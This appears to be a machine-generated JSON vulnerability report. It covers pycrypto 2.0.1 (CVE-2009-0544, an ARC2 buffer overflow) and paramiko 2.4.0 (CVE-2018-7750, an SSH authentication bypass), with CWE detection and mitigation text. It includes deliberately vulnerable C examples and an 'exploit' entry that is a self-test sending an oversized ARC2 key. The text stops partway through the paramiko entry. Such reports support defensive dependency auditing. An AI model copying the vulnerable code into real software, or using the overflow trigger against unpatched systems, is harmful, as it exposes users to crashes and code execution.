{
  "@context": "https://github.com/GermanMT/depex/wiki/VAN-Spec-v0.1.0",
  "timestamp": "2024-05-23 10:54:59.505220",
  "version": 1,
  "statements_assisting_information": [
    {
      "affected_component": "pycrypto",
      "affected_component_version": "2.0.1",
      "vulnerability": {
        "@id": "https://nvd.nist.gov/vuln/detail/CVE-2009-0544",
        "name": "CVE-2009-0544",
        "description": "Buffer overflow in the PyCrypto ARC2 module 2.0.1 allows remote attackers to cause a denial of service and possibly execute arbitrary code via a large ARC2 key length.",
        "cvss": {
          "vuln_impact": 10.0,
          "attack_vector": "AV:N/AC:L/Au:N/C:C/I:C/A:C"
        },
        "cwes": [
          {
            "@id": "https://cwe.mitre.org/data/definitions/119.html",
            "name": "119",
            "description": {
              "xhtml:p": [
                "Certain languages allow direct addressing of memory locations and do not automatically ensure that these locations are valid for the memory buffer that is being referenced. This can cause read or write operations to be performed on memory locations that may be associated with other variables, data structures, or internal program data.",
                "As a result, an attacker may be able to execute arbitrary code, alter the intended control flow, read sensitive information, or cause the system to crash."
              ]
            },
            "consequences": [
              {
                "Scope": [
                  "Integrity",
                  "Confidentiality",
                  "Availability"
                ],
                "Impact": [
                  "Execute Unauthorized Code or Commands",
                  "Modify Memory"
                ],
                "Note": "If the memory accessible by the attacker can be effectively controlled, it may be possible to execute arbitrary code, as with a standard buffer overflow. If the attacker can overwrite a pointer's worth of memory (usually 32 or 64 bits), they can redirect a function pointer to their own malicious code. Even when the attacker can only modify a single byte arbitrary code execution can be possible. Sometimes this is because the same problem can be exploited repeatedly to the same effect. Other times it is because the attacker can overwrite security-critical application-specific data -- such as a flag indicating whether the user is an administrator."
              },
              {
                "Scope": [
                  "Availability",
                  "Confidentiality"
                ],
                "Impact": [
                  "Read Memory",
                  "DoS: Crash, Exit, or Restart",
                  "DoS: Resource Consumption (CPU)",
                  "DoS: Resource Consumption (Memory)"
                ],
                "Note": "Out of bounds memory access will very likely result in the corruption of relevant memory, and perhaps instructions, possibly leading to a crash. Other attacks leading to lack of availability are possible, including putting the program into an infinite loop."
              },
              {
                "Scope": "Confidentiality",
                "Impact": "Read Memory",
                "Note": "In the case of an out-of-bounds read, the attacker may have access to sensitive information. If the sensitive information contains system details, such as the current buffers position in memory, this knowledge can be used to craft further attacks, possibly with more severe consequences."
              }
            ],
            "detection_methods": [
              {
                "@Detection_Method_ID": "DM-1",
                "Method": "Automated Static Analysis",
                "Description": {
                  "xhtml:p": [
                    "This weakness can often be detected using automated static analysis tools. Many modern tools use data flow analysis or constraint-based techniques to minimize the number of false positives.",
                    "Automated static analysis generally does not account for environmental considerations when reporting out-of-bounds memory operations. This can make it difficult for users to determine which warnings should be investigated first. For example, an analysis tool might report buffer overflows that originate from command line arguments in a program that is not expected to run with setuid or other special privileges."
                  ]
                },
                "Effectiveness": "High",
                "Effectiveness_Notes": "Detection techniques for buffer-related errors are more mature than for most other weakness types."
              },
              {
                "@Detection_Method_ID": "DM-2",
                "Method": "Automated Dynamic Analysis",
                "Description": "This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results."
              },
              {
                "Method": "Automated Static Analysis - Binary or Bytecode",
                "Description": {
                  "xhtml:p": "According to SOAR, the following detection techniques may be useful:",
                  "xhtml:div": {
                    "@style": "margin-left:1em;",
                    "xhtml:div": "Cost effective for partial coverage:",
                    "xhtml:ul": {
                      "xhtml:li": [
                        "Binary / Bytecode Quality Analysis",
                        "Bytecode Weakness Analysis - including disassembler + source code weakness analysis",
                        "Binary Weakness Analysis - including disassembler + source code weakness analysis"
                      ]
                    }
                  }
                },
                "Effectiveness": "SOAR Partial"
              },
              {
                "Method": "Manual Static Analysis - Binary or Bytecode",
                "Description": {
                  "xhtml:p": "According to SOAR, the following detection techniques may be useful:",
                  "xhtml:div": {
                    "@style": "margin-left:1em;",
                    "xhtml:div": "Cost effective for partial coverage:",
                    "xhtml:ul": {
                      "xhtml:li": "Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies"
                    }
                  }
                },
                "Effectiveness": "SOAR Partial"
              },
              {
                "Method": "Dynamic Analysis with Automated Results Interpretation",
                "Description": {
                  "xhtml:p": "According to SOAR, the following detection techniques may be useful:",
                  "xhtml:div": {
                    "@style": "margin-left:1em;",
                    "xhtml:div": "Cost effective for partial coverage:",
                    "xhtml:ul": {
                      "xhtml:li": [
                        "Web Application Scanner",
                        "Web Services Scanner",
                        "Database Scanners"
                      ]
                    }
                  }
                },
                "Effectiveness": "SOAR Partial"
              },
              {
                "Method": "Dynamic Analysis with Manual Results Interpretation",
                "Description": {
                  "xhtml:p": "According to SOAR, the following detection techniques may be useful:",
                  "xhtml:div": {
                    "@style": "margin-left:1em;",
                    "xhtml:div": "Cost effective for partial coverage:",
                    "xhtml:ul": {
                      "xhtml:li": [
                        "Fuzz Tester",
                        "Framework-based Fuzzer"
                      ]
                    }
                  }
                },
                "Effectiveness": "SOAR Partial"
              },
              {
                "Method": "Manual Static Analysis - Source Code",
                "Description": {
                  "xhtml:p": "According to SOAR, the following detection techniques may be useful:",
                  "xhtml:div": {
                    "@style": "margin-left:1em;",
                    "xhtml:div": "Cost effective for partial coverage:",
                    "xhtml:ul": {
                      "xhtml:li": [
                        "Focused Manual Spotcheck - Focused manual analysis of source",
                        "Manual Source Code Review (not inspections)"
                      ]
                    }
                  }
                },
                "Effectiveness": "SOAR Partial"
              },
              {
                "Method": "Automated Static Analysis - Source Code",
                "Description": {
                  "xhtml:p": "According to SOAR, the following detection techniques may be useful:",
                  "xhtml:div": {
                    "@style": "margin-left:1em;",
                    "xhtml:div": [
                      "Highly cost effective:",
                      "Cost effective for partial coverage:"
                    ],
                    "xhtml:ul": [
                      {
                        "xhtml:li": [
                          "Source code Weakness Analyzer",
                          "Context-configured Source Code Weakness Analyzer"
                        ]
                      },
                      {
                        "xhtml:li": "Source Code Quality Analyzer"
                      }
                    ]
                  }
                },
                "Effectiveness": "High"
              },
              {
                "Method": "Architecture or Design Review",
                "Description": {
                  "xhtml:p": "According to SOAR, the following detection techniques may be useful:",
                  "xhtml:div": {
                    "@style": "margin-left:1em;",
                    "xhtml:div": [
                      "Highly cost effective:",
                      "Cost effective for partial coverage:"
                    ],
                    "xhtml:ul": [
                      {
                        "xhtml:li": "Formal Methods / Correct-By-Construction"
                      },
                      {
                        "xhtml:li": "Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)"
                      }
                    ]
                  }
                },
                "Effectiveness": "High"
              }
            ],
            "potential_mitigations": [
              {
                "@Mitigation_ID": "MIT-3",
                "Phase": "Requirements",
                "Strategy": "Language Selection",
                "Description": {
                  "xhtml:p": [
                    "Use a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.",
                    "For example, many languages that perform their own memory management, such as Java and Perl, are not subject to buffer overflows. Other languages, such as Ada and C#, typically provide overflow protection, but the protection can be disabled by the programmer.",
                    "Be wary that a language's interface to native code may still be subject to overflows, even if the language itself is theoretically safe."
                  ]
                }
              },
              {
                "@Mitigation_ID": "MIT-4.1",
                "Phase": "Architecture and Design",
                "Strategy": "Libraries or Frameworks",
                "Description": {
                  "xhtml:p": [
                    "Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.",
                    "Examples include the Safe C String Library (SafeStr) by Messier and Viega [REF-57], and the Strsafe.h library from Microsoft [REF-56]. These libraries provide safer versions of overflow-prone string-handling functions."
                  ]
                },
                "Effectiveness_Notes": "This is not a complete solution, since many buffer overflows are not related to strings."
              },
              {
                "@Mitigation_ID": "MIT-10",
                "Phase": [
                  "Operation",
                  "Build and Compilation"
                ],
                "Strategy": "Environment Hardening",
                "Description": {
                  "xhtml:p": [
                    "Use automatic buffer overflow detection mechanisms that are offered by certain compilers or compiler extensions. Examples include: the Microsoft Visual Studio /GS flag, Fedora/Red Hat FORTIFY_SOURCE GCC flag, StackGuard, and ProPolice, which provide various mechanisms including canary-based detection and range/index checking.",
                    "D3-SFCV (Stack Frame Canary Validation) from D3FEND [REF-1334] discusses canary-based detection in detail."
                  ]
                },
                "Effectiveness": "Defense in Depth",
                "Effectiveness_Notes": {
                  "xhtml:p": "This is not necessarily a complete solution, since these mechanisms only detect certain types of overflows. In addition, the result is still a denial of service, since the typical response is to exit the application."
                }
              },
              {
                "@Mitigation_ID": "MIT-9",
                "Phase": "Implementation",
                "Description": {
                  "xhtml:p": "Consider adhering to the following rules when allocating and managing an application's memory:",
                  "xhtml:ul": {
                    "xhtml:li": [
                      "Double check that the buffer is as large as specified.",
                      "When using functions that accept a number of bytes to copy, such as strncpy(), be aware that if the destination buffer size is equal to the source buffer size, it may not NULL-terminate the string.",
                      "Check buffer boundaries if accessing the buffer in a loop and make sure there is no danger of writing past the allocated space.",
                      "If necessary, truncate all input strings to a reasonable length before passing them to the copy and concatenation functions."
                    ]
                  }
                }
              },
              {
                "@Mitigation_ID": "MIT-11",
                "Phase": [
                  "Operation",
                  "Build and Compilation"
                ],
                "Strategy": "Environment Hardening",
                "Description": {
                  "xhtml:p": [
                    "Run or compile the software using features or extensions that randomly arrange the positions of a program's executable and libraries in memory. Because this makes the addresses unpredictable, it can prevent an attacker from reliably jumping to exploitable code.",
                    "Examples include Address Space Layout Randomization (ASLR) [REF-58] [REF-60] and Position-Independent Executables (PIE) [REF-64]. Imported modules may be similarly realigned if their default memory addresses conflict with other modules, in a process known as \"rebasing\" (for Windows) and \"prelinking\" (for Linux) [REF-1332] using randomly generated addresses. ASLR for libraries cannot be used in conjunction with prelink since it would require relocating the libraries at run-time, defeating the whole purpose of prelinking.",
                    "For more information on these techniques see D3-SAOR (Segment Address Offset Randomization) from D3FEND [REF-1335]."
                  ]
                },
                "Effectiveness": "Defense in Depth",
                "Effectiveness_Notes": "These techniques do not provide a complete solution.  For instance, exploits frequently use a bug that discloses memory addresses in order to maximize reliability of code execution [REF-1337]. It has also been shown that a side-channel attack can bypass ASLR [REF-1333]"
              },
              {
                "@Mitigation_ID": "MIT-12",
                "Phase": "Operation",
                "Strategy": "Environment Hardening",
                "Description": {
                  "xhtml:p": [
                    "Use a CPU and operating system that offers Data Execution Protection (using hardware NX or XD bits) or the equivalent techniques that simulate this feature in software, such as PaX [REF-60] [REF-61]. These techniques ensure that any instruction executed is exclusively at a memory address that is part of the code segment.",
                    "For more information on these techniques see D3-PSEP (Process Segment Execution Prevention) from D3FEND [REF-1336]."
                  ]
                },
                "Effectiveness": "Defense in Depth",
                "Effectiveness_Notes": "This is not a complete solution, since buffer overflows could be used to overwrite nearby variables to modify the software's state in dangerous ways. In addition, it cannot be used in cases in which self-modifying code is required. Finally, an attack could still cause a denial of service, since the typical response is to exit the application."
              },
              {
                "@Mitigation_ID": "MIT-13",
                "Phase": "Implementation",
                "Description": "Replace unbounded copy functions with analogous functions that support length arguments, such as strcpy with strncpy. Create these if they are not available.",
                "Effectiveness": "Moderate",
                "Effectiveness_Notes": "This approach is still susceptible to calculation errors, including issues such as off-by-one errors (CWE-193) and incorrectly calculating buffer lengths (CWE-131)."
              }
            ],
            "demonstrative_examples": [
              {
                "@Demonstrative_Example_ID": "DX-1",
                "Intro_Text": "This example takes an IP address from a user, verifies that it is well formed and then looks up the hostname and copies it into a buffer.",
                "Example_Code": {
                  "@Nature": "Bad",
                  "@Language": "C",
                  "xhtml:div": {
                    "xhtml:div": {
                      "@style": "margin-left:1em;",
                      "xhtml:div": {
                        "xhtml:br": [
                          null,
                          null,
                          null,
                          null,
                          null,
                          null,
                          null,
                          null,
                          null,
                          null
                        ],
                        "xhtml:i": "/*routine that ensures user_supplied_addr is in the right format for conversion */",
                        "#text": "struct hostent *hp;in_addr_t *addr;char hostname[64];in_addr_t inet_addr(const char *cp);\n                           \n                           \n                           \n                           validate_addr_form(user_supplied_addr);addr = inet_addr(user_supplied_addr);hp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET);strcpy(hostname, hp->h_name);"
                      }
                    },
                    "#text": "void host_lookup(char *user_supplied_addr){}"
                  }
                },
                "Body_Text": [
                  "This function allocates a buffer of 64 bytes to store the hostname, however there is no guarantee that the hostname will not be larger than 64 bytes. If an attacker specifies an address which resolves to a very large hostname, then the function may overwrite sensitive data or even relinquish control flow to the attacker.",
                  "Note that this example also contains an unchecked return value (CWE-252) that can lead to a NULL pointer dereference (CWE-476)."
                ]
              },
              {
                "@Demonstrative_Example_ID": "DX-19",
                "Intro_Text": "This example applies an encoding procedure to an input string and stores it into a buffer.",
                "Example_Code": {
                  "@Nature": "Bad",
                  "@Language": "C",
                  "xhtml:div": {
                    "xhtml:div": {
                      "@style": "margin-left:1em;",
                      "xhtml:div": {
                        "xhtml:br": [
                          null,
                          null,
                          null,
                          null,
                          null
                        ],
                        "xhtml:div": [
                          {
                            "@style": "margin-left:1em;",
                            "#text": "die(\"user string too long, die evil hacker!\");"
                          },
                          {
                            "@style": "margin-left:1em;",
                            "xhtml:div": {
                              "xhtml:div": [
                                {
                                  "@style": "margin-left:1em;",
                                  "xhtml:br": [
                                    null,
                                    null,
                                    null,
                                    null
                                  ],
                                  "#text": "dst_buf[dst_index++] = '&';dst_buf[dst_index++] = 'a';dst_buf[dst_index++] = 'm';dst_buf[dst_index++] = 'p';dst_buf[dst_index++] = ';';"
                                },
                                {
                                  "@style": "margin-left:1em;",
                                  "xhtml:i": "/* encode to &lt; */",
                                  "xhtml:br": null
                                }
                              ],
                              "xhtml:br": [
                                null,
                                null
                              ],
                              "#text": "if( '&' == user_supplied_string[i] ){}else if ('<' == user_supplied_string[i] ){}else dst_buf[dst_index++] = user_supplied_string[i];"
                            }
                          }
                        ],
                        "#text": "int i, dst_index;char *dst_buf = (char*)malloc(4*sizeof(char) * MAX_SIZE);if ( MAX_SIZE <= strlen(user_supplied_string) ){}dst_index = 0;for ( i = 0; i < strlen(user_supplied_string); i++ ){}return dst_buf;"
                      }
                    },
                    "#text": "char * copy_input(char *user_supplied_string){}"
                  }
                },
                "Body_Text": "The programmer attempts to encode the ampersand character in the user-controlled string, however the length of the string is validated before the encoding procedure is applied. Furthermore, the programmer assumes encoding expansion will only expand a given character by a factor of 4, while the encoding of the ampersand expands by 5. As a result, when the encoding procedure expands the string it is possible to overflow the destination buffer if the attacker provides a string of many ampersands."
              },
              {
                "@Demonstrative_Example_ID": "DX-90",
                "Intro_Text": "The following example asks a user for an offset into an array to select an item.",
                "Example_Code": {
                  "@Nature": "Bad",
                  "@Language": "C",
                  "xhtml:div": {
                    "xhtml:br": null,
                    "xhtml:div": {
                      "@style": "margin-left:1em;",
                      "xhtml:br": [
                        null,
                        null
                      ],
                      "#text": "char *items[] = {\"boat\", \"car\", \"truck\", \"train\"};int index = GetUntrustedOffset();printf(\"You selected %s\\n\", items[index-1]);"
                    },
                    "#text": "int main (int argc, char **argv) {}"
                  }
                },
                "Body_Text": "The programmer allows the user to specify which element in the list to select, however an attacker can provide an out-of-bounds offset, resulting in a buffer over-read (CWE-126)."
              },
              {
                "@Demonstrative_Example_ID": "DX-100",
                "Intro_Text": "In the following code, the method retrieves a value from an array at a specific array index location that is given as an input parameter to the method",
                "Example_Code": [
                  {
                    "@Nature": "Bad",
                    "@Language": "C",
                    "xhtml:div": {
                      "xhtml:div": {
                        "@style": "margin-left:1em;",
                        "xhtml:div": {
                          "xhtml:br": [
                            null,
                            null,
                            null,
                            null,
                            null,
                            null,
                            null,
                            null,
                            null,
                            null,
                            null
                          ],
                          "xhtml:i": [
                            "// check that the array index is less than the maximum",
                            "// length of the array",
                            "// if array index is invalid then output error message",
                            "// and return value indicating error"
                          ],
                          "xhtml:div": [
                            {
                              "@style": "margin-left:1em;",
                              "xhtml:div": {
                                "xhtml:i": "// get the value at the specified index of the array",
                                "xhtml:br": null,
                                "#text": "value = array[index];"
                              }
                            },
                            {
                              "@style": "margin-left:1em;",
                              "xhtml:br": null,
                              "#text": "printf(\"Value is: %d\\n\", array[index]);value = -1;"
                            }
                          ],
                          "#text": "int value;\n                           \n                           \n                           \n                           \n                           \n                           if (index < len) {}\n                           \n                           \n                           \n                           else {}\n                           return value;"
                        }
                      },
                      "#text": "int getValueFromArray(int *array, int len, int index) {}"
                    }
                  },
                  {
                    "@Nature": "Good",
                    "@Language": "C",
                    "xhtml:div": {
                      "xhtml:br": [
                        null,
                        null,
                        null,
                        null,
                        null,
                        null,
                        null,
                        null
                      ],
                      "xhtml:i": [
                        "// check that the array index is within the correct",
                        "// range of values for the array"
                      ],
                      "#text": "...\n                     \n                     \n                     \n                     \n                     \n                     if (index >= 0 && index < len) {\n                     ..."
                    }
                  }
                ],
                "Body_Text": "However, this method only verifies that the given array index is less than the maximum length of the array but does not check for the minimum value (CWE-839). This will allow a negative value to be accepted as the input array index, which will result in a out of bounds read (CWE-125) and may allow access to sensitive memory. The input array index should be checked to verify that is within the maximum and minimum range required for the array (CWE-129). In this example the if statement should be modified to include a minimum range check, as shown below."
              },
              {
                "Intro_Text": "Windows provides the _mbs family of functions to perform various operations on multibyte strings. When these functions are passed a malformed multibyte string, such as a string containing a valid leading byte followed by a single null byte, they can read or write past the end of the string buffer causing a buffer overflow. The following functions all pose a risk of buffer overflow: _mbsinc _mbsdec _mbsncat _mbsncpy _mbsnextc _mbsnset _mbsrev _mbsset _mbsstr _mbstok _mbccpy _mbslen"
              }
            ]
          }
        ]
      },
      "exploits": [
        {
          "@id": "https://www.exploit-db.com/exploits/32780",
          "description": "",
          "payload": "source: https://www.securityfocus.com/bid/33674/info\r\n\r\nPyCrypto (Python Cryptography Toolkit) is prone to a buffer-overflow vulnerability because it fails to adequately verify user-supplied input.\r\n\r\nSuccessful exploits may allow attackers to execute arbitrary code in the context of applications using the vulnerable module. Failed attempts may lead to a denial-of-service condition.\r\n\r\n# -*- coding: utf-8 -*-\r\n#\r\n#  SelfTest/Cipher/ARC2.py: Self-test for the Alleged-RC2 cipher\r\n#\r\n# =======================================================================\r\n# Copyright (C) 2008  Dwayne C. Litzenberger <dlitz@dlitz.net>\r\n#\r\n# Permission is hereby granted, free of charge, to any person obtaining\r\n# a copy of this software and associated documentation files (the\r\n# \"Software\"), to deal in the Software without restriction, including\r\n# without limitation the rights to use, copy, modify, merge, publish,\r\n# distribute, sublicense, and/or sell copies of the Software, and to\r\n# permit persons to whom the Software is furnished to do so.\r\n#\r\n# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\r\n# \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\r\n# LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR\r\n# A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT\r\n# OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,\r\n# SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT\r\n# LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,\r\n# DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY\r\n# THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\r\n# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE\r\n# OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\r\n# =======================================================================\r\n#\r\n\r\n\"\"\"Self-test suite for Crypto.Cipher.ARC2\"\"\"\r\n\r\n__revision__ = \"$Id$\"\r\n\r\nfrom common import dict     # For compatibility with Python 2.1 and 2.2\r\n\r\nimport unittest\r\n\r\n# This is a list of (plaintext, ciphertext, key[, description[, extra_params]]) tuples.\r\ntest_data = [\r\n    # Test vectors from RFC 2268\r\n\r\n    # 63-bit effective key length\r\n    ('0000000000000000', 'ebb773f993278eff', '0000000000000000',\r\n        'RFC2268-1', dict(effective_keylen=63)),\r\n\r\n    # 64-bit effective key length\r\n    ('ffffffffffffffff', '278b27e42e2f0d49', 'ffffffffffffffff',\r\n        'RFC2268-2', dict(effective_keylen=64)),\r\n    ('1000000000000001', '30649edf9be7d2c2', '3000000000000000',\r\n        'RFC2268-3', dict(effective_keylen=64)),\r\n    ('0000000000000000', '61a8a244adacccf0', '88',\r\n        'RFC2268-4', dict(effective_keylen=64)),\r\n    ('0000000000000000', '6ccf4308974c267f', '88bca90e90875a',\r\n        'RFC2268-5', dict(effective_keylen=64)),\r\n    ('0000000000000000', '1a807d272bbe5db1', '88bca90e90875a7f0f79c384627bafb2',\r\n        'RFC2268-6', dict(effective_keylen=64)),\r\n\r\n    # 128-bit effective key length\r\n    ('0000000000000000', '2269552ab0f85ca6', '88bca90e90875a7f0f79c384627bafb2',\r\n        \"RFC2268-7\", dict(effective_keylen=128)),\r\n    ('0000000000000000', '5b78d3a43dfff1f1',\r\n        '88bca90e90875a7f0f79c384627bafb216f80a6f85920584c42fceb0be255daf1e',\r\n        \"RFC2268-8\", dict(effective_keylen=129)),\r\n\r\n    # Test vectors from PyCrypto 2.0.1's testdata.py\r\n    # 1024-bit effective key length\r\n    ('0000000000000000', '624fb3e887419e48', '5068696c6970476c617373',\r\n        'PCTv201-0'),\r\n    ('ffffffffffffffff', '79cadef44c4a5a85', '5068696c6970476c617373',\r\n        'PCTv201-1'),\r\n    ('0001020304050607', '90411525b34e4c2c', '5068696c6970476c617373',\r\n        'PCTv201-2'),\r\n    ('0011223344556677', '078656aaba61cbfb', '5068696c6970476c617373',\r\n        'PCTv201-3'),\r\n    ('0000000000000000', 'd7bcc5dbb4d6e56a', 'ffffffffffffffff', 'PCTv201-4'),\r\n    ('ffffffffffffffff', '7259018ec557b357', 'ffffffffffffffff', 'PCTv201-5'),\r\n    ('0001020304050607', '93d20a497f2ccb62', 'ffffffffffffffff', 'PCTv201-6'),\r\n    ('0011223344556677', 'cb15a7f819c0014d', 'ffffffffffffffff', 'PCTv201-7'),\r\n    ('0000000000000000', '63ac98cdf3843a7a',\r\n        'ffffffffffffffff5065746572477265656e6177617953e5ffe553',\r\n        'PCTv201-8'),\r\n    ('ffffffffffffffff', '3fb49e2fa12371dd',\r\n        'ffffffffffffffff5065746572477265656e6177617953e5ffe553',\r\n        'PCTv201-9'),\r\n    ('0001020304050607', '46414781ab387d5f',\r\n        'ffffffffffffffff5065746572477265656e6177617953e5ffe553',\r\n        'PCTv201-10'),\r\n    ('0011223344556677', 'be09dc81feaca271',\r\n        'ffffffffffffffff5065746572477265656e6177617953e5ffe553',\r\n        'PCTv201-11'),\r\n    ('0000000000000000', 'e64221e608be30ab', '53e5ffe553', 'PCTv201-12'),\r\n    ('ffffffffffffffff', '862bc60fdcd4d9a9', '53e5ffe553', 'PCTv201-13'),\r\n    ('0001020304050607', '6a34da50fa5e47de', '53e5ffe553', 'PCTv201-14'),\r\n    ('0011223344556677', '584644c34503122c', '53e5ffe553', 'PCTv201-15'),\r\n]\r\n\r\nclass BufferOverflowTest(unittest.TestCase):\r\n    # Test a buffer overflow found in older versions of PyCrypto\r\n\r\n    def setUp(self):\r\n        global ARC2\r\n        from Crypto.Cipher import ARC2\r\n\r\n    def runTest(self):\r\n        \"\"\"ARC2 with keylength > 128\"\"\"\r\n        key = \"x\" * 16384\r\n        mode = ARC2.MODE_ECB\r\n        self.assertRaises(ValueError, ARC2.new, key, mode)\r\n\r\ndef get_tests(config={}):\r\n    from Crypto.Cipher import ARC2\r\n    from common import make_block_tests\r\n\r\n    tests = make_block_tests(ARC2, \"ARC2\", test_data)\r\n    tests.append(BufferOverflowTest())\r\n\r\n    return tests\r\n\r\nif __name__ == '__main__':\r\n    import unittest\r\n    suite = lambda: unittest.TestSuite(get_tests())\r\n    unittest.main(defaultTest='suite')\r\n\r\n# vim:set ts=4 sw=4 sts=4 expandtab:"
        },
        {
          "@id": "https://www.seebug.org/vuldb/ssvid-4798",
          "description": "BUGTRAQ  ID: 33674\r\nCVE(CAN) ID: CVE-2009-0544\r\n\r\nPyCrypto\u662f\u4f7f\u7528Python\u7f16\u5199\u7684\u52a0\u5bc6\u5de5\u5177\u5305\u3002\r\n\r\nPyCrypto\u7684ARC2\u6a21\u5757\u4e2d\u5b58\u5728\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u5982\u679c\u8fdc\u7a0b\u653b\u51fb\u8005\u5728\u53d1\u9001\u7684\u8bf7\u6c42\u4e2d\u5305\u542b\u6709\u8d85\u957f\u7684ARC2\u5bc6\u94a5\u957f\u5ea6\u7684\u8bdd\uff0c\u5c31\u53ef\u4ee5\u89e6\u53d1\u8fd9\u4e2a\u6ea2\u51fa\uff0c\u5bfc\u81f4\u62d2\u7edd\u670d\u52a1\u6216\u6267\u884c\u4efb\u610f\u6307\u4ee4\u3002\n\nDwayne C. Litzenberger PyCrypto 2.0.x\n \u5382\u5546\u8865\u4e01\uff1a\r\n\r\nDwayne C. Litzenberger\r\n----------------------\r\n\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4e86\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u8fd9\u4e2a\u5b89\u5168\u95ee\u9898\uff0c\u8bf7\u5230\u5382\u5546\u7684\u4e3b\u9875\u4e0b\u8f7d\uff1a\r\n\r\n<a href=http://gitweb2.dlitz.net/?p=crypto/pycrypto-2.x.git;a=commitdiff;h=d1c4875e1f220652fe7ff8358f56dee3b2aba31b target=_blank rel=external nofollow>http://gitweb2.dlitz.net/?p=crypto/pycrypto-2.x.git;a=commitdiff;h=d1c4875e1f220652fe7ff8358f56dee3b2aba31b</a>",
          "payload": "\n                                                http://gitweb2.dlitz.net/?p=crypto/pycrypto-2.x.git;a=blob;f=SelfTest/Cipher/test_ARC2.py;h=84d42410\r\n\n                              "
        }
      ],
      "priority": 9.0
    },
    {
      "affected_component": "paramiko",
      "affected_component_version": "2.4.0",
      "vulnerability": {
        "@id": "https://nvd.nist.gov/vuln/detail/CVE-2018-7750",
        "name": "CVE-2018-7750",
        "description": "transport.py in the SSH server implementation of Paramiko before 1.17.6, 1.18.x before 1.18.5, 2.0.x before 2.0.8, 2.1.x before 2.1.5, 2.2.x before 2.2.3, 2.3.x before 2.3.2, and 2.4.x before 2.4.1 does not properly check whether authentication is completed before processing other requests, as demonstrated by channel-open. A customized SSH client can simply skip the authentication step.",
        "cvss": {
          "vuln_impact": 5.9,
          "attack_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
        },
        "cwes": [
          {
            "@id": "https://cwe.mitre.org/data/definitions/287.html",
            "name": "287",
            "description": "When an actor claims to have a given identity, the product does not prove or insufficiently proves that the claim is correct.",
            "consequences": {
              "Scope": [
                "Integrity",
                "Confidentiality",
                "Availability",
                "Access Control"
              ],
              "Impact": [
                "Read Application Data",
                "Gain Privileges or Assume Identity",
                "Execute Unauthorized Code or Commands"
              ],
              "Note": "This weakness can lead to the exposure of resources or functionality to unintended actors, possibly providing attackers with sensitive information or even execute arbitrary code."
            },
            "detection_methods": [
              {
                "@Detection_Method_ID": "DM-6",
                "Method": "Automated Static Analysis",
                "Description": {
                  "xhtml:p": [
                    "Automated static analysis is useful for detecting certain types of authentication. A tool may be able to analyze related configuration files, such as .htaccess in Apache web servers, or detect the usage of commonly-used authentication libraries.",
                    "Generally, automated static analysis tools have difficulty detecting custom authentication schemes. In addition, the software's design may include some functionality that is accessible to any user and does not require an established identity; an automated technique that detects the absence of authentication may report false positives."
                  ]
                },
                "Effectiveness": "Limited"
              },
              {
                "@Detection_Method_ID": "DM-7",
                "Method": "Manual Static Analysis",
                "Description": {
                  "xhtml:p": [
                    "This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.",
                    "Manual static analysis is useful for evaluating the correctness of custom authentication mechanisms."
                  ]
                },
                "Effectiveness": "High",
                "Effectiveness_Notes": "These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules."
              },
              {
                "Method": "Manual Static Analysis - Binary or Bytecode",
                "Description": {
                  "xhtml:p": "According to SOAR, the following detection techniques may be useful:",
                  "xhtml:div": {
                    "@style": "margin-left:1em;",
                    "xhtml:div": "Cost effective for partial coverage:",
                    "xhtml:ul": {
                      "xhtml:li": "Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies"
                    }
                  }
                },
                "Effectiveness": "SOAR Partial"
              },
              {
                "Method": "Dynamic Analysis with Automated Results Interpretation",
                "Description": {
                  "xhtml:p": "According to SOAR, the following detection techniques may be useful:",
                  "xhtml:div": {
                    "@style": "margin-left:1em;",
                    "xhtml:div": "Cost effective for partial coverage:",
                    "xhtml:ul": {
                      "xhtml:li": [
                        "Web Application Scanner",
                        "Web Services Scanner",
                        "Database Scanners"
                      ]
                    }
                  }
                },
                "Effectiveness": "SOAR Partial"
              },
              {
                "Method": "Dynamic Analysis with Manual Results Interpretation",
                "Description": {
                  "xhtml:p": "According to SOAR, the following detection techniques may be useful:",
                  "xhtml:div": {
                    "@style": "margin-left:1em;",
                    "xhtml:div": "Cost effective for partial coverage:",
                    "xhtml:ul": {
                      "xhtml:li": [
                        "Fuzz Tester",
                        "Framework-based Fuzzer"
                      ]
                    }
                  }
                },
                "Effectiveness": "SOAR Partial"
              },
              {
                "Method": "Manual Static Analysis - Source Code",
                "Description": {
                  "xhtml:p": "According to SOAR, the following detection techniques may be useful:",
                  "xhtml:div": {
                    "@style": "margin-left:1em;",
                    "xhtml:div": "Cost effective for partial coverage:",
                    "xhtml:ul": {
